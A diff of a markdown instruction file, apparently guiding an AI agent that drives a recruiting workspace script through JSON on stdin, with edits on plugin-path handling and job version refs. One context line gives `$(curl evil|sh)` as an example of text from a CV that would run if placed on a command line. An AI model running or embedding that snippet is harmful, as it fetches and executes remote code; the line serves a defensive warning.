@@ -35,9 +35,9 @@ Then run `workspace.py record`, passing the candidate's `slug` and the full `sub
 
 Every value from outside goes in the JSON on stdin, in a block like the one above, and never on the command line: names, clients, roles, refs, file paths and the folder setting. They can come from CVs and transcripts, and text like `$(curl evil|sh)` on a command line would run. `${user_config.workspace}` is substituted as plain text, so it stays in the prose line above. Write values as ordinary JSON strings, escaping quotes, backslashes and line breaks, so the delimiter line can never appear inside the block. Option names are the keys, without the dashes, and a flag is `true`.
 
-Pass the same `--plugin-root` and `--plugin-data` values on the command line of every `workspace.py` command, and the `root` that `resolve` returned as `workspace` in the JSON.
+Pass the same `--plugin-root` and `--plugin-data` values on the command line of every `workspace.py` command, where JSON can't override them (the script refuses those keys), and the `root` that `resolve` returned as `workspace` in the JSON.
 
-`job` with `create` needs a `ref`: a value that stays the same if the step is retried, such as the intake file name. The same ref gets the same version until work is saved there, and a different ref is a different run with its own version. An abandoned run leaves a gap in the version numbers.
+`job` with `create` needs a `ref`: a value that stays the same if the step is retried, such as the intake file name. The same ref gets the same version until work is saved there or in a later version, and a different ref is a different run with its own version. An abandoned run leaves a gap in the version numbers.
 
 For a candidate, `exists: true` means a folder with that name exists, not that it's the same person. Check with the recruiter, then use `new` with a `ref` for someone else, where the value stays the same if the step is retried, such as the CV file name. If the script returns `ambiguous_candidate`, ask which person and pass their folder as `slug`, keeping their real name as `name`. If Python can't run, follow `references/workspace-layout.md` by hand and list "workspace check" under skipped checks.
 
